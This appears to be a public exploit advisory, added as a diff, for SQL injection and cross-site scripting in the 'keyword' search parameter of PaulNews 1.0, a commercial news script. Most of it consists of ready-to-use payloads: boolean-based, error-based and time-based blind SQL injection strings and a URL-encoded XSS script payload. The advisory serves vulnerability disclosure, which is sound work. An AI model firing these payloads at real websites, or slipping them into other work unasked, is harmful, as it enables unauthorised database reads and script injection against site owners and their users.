@@ -1,0 +1,44 @@
+# Exploit Title: PaulNews 1.0 - 'keyword' SQL Injection / Cross-Site Scripting
+# Dork: N/A
+# Date: 23.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor: MediaSoft Pro
+# Vendor Homepage: https://codecanyon.net/item/paulnews-newspaper-and-magazine-script/19260686
+# Version: v1.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : The vulnerability allows an attacker to inject sql commands
+from the search section with 'keyword' parameter. You can use the GET or
+POST methods.
+====================================================
+
+# PoC : SQLi :
+
+http://test.com/news/search?keyword=[SQL]
+
+# Vulnerable Payload :
+
+Parameter: query (GET)
+      Type : boolean-based blind
+      Demo : http://test.com/news/search?keyword=test
+    Payload: keyword=-3431') OR 6871=6871#
+
+      Type : error-based
+      Demo : http://test.com/news/search?keyword=test
+    Payload: keyword=test') OR (SELECT 8996 FROM(SELECT
+COUNT(*),CONCAT(0x71626b6271,(SELECT
+(ELT(8996=8996,1))),0x71766b7671,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IsdG
+
+      Type : AND/OR time-based blind
+      Demo : http://test.com/news/search?keyword=test
+    Payload: keyword=test') OR SLEEP(5)-- OEdN
+
+
+====================================================
+
+# PoC : XSS :
+
+    Payload :
+http://test.com/news/search?keyword=%27%20%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E%E2%80%98
+;
